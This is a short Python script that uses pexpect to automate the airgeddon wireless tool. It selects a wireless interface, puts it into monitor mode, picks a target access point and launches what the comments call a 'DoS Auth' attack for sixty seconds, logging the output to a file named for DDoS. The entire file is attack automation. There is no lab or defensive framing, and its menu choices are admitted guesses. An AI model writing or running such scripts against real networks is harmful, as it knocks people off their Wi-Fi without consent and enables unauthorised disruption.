import pexpect
import os
import time
 
# Set airgeddon path (adjust this!)
airgeddon_path = "/root/airgeddon/airgeddon.sh"
 
# Ensure it's executable
os.system(f"chmod +x {airgeddon_path}")
 
# Start airgeddon
child = pexpect.spawn(f"bash {airgeddon_path}", encoding='utf-8')
 
# Log output for debugging
child.logfile = open("airgeddon_ddos_log.txt", "w")
 
try:
    # 1. Select interface (e.g., wlan0)
    child.expect("Select your wireless interface", timeout=20)
    child.sendline("1")  # Replace with actual option for your interface
 
    # 2. Choose monitor mode option
    child.expect("Put selected interface into monitor mode", timeout=20)
    child.sendline("1")
 
    # 3. Select handshake or attack menu (depends on version of airgeddon)
    child.expect("Select an option", timeout=20)
    child.sendline("7")  # This may vary - adjust as per airgeddon version
 
    # 4. Select target AP (you'll likely need to scan first)
    child.expect("Select an AP", timeout=30)
    child.sendline("1")  # Select target AP
 
    # 5. Launch DoS Auth attack
    child.expect("Select attack type", timeout=20)
    child.sendline("4")  # If 4 is DoS Auth - may vary
 
    # Let it run for a while
    time.sleep(60)
 
    # You can later send Ctrl+C or gracefully stop
    child.sendcontrol('c')
 
except pexpect.exceptions.TIMEOUT:
    print("[!] Timeout - check if airgeddon is prompting unexpectedly.")
except pexpect.exceptions.EOF:
    print("[!] EOF - script exited.")
finally:
    child.close()
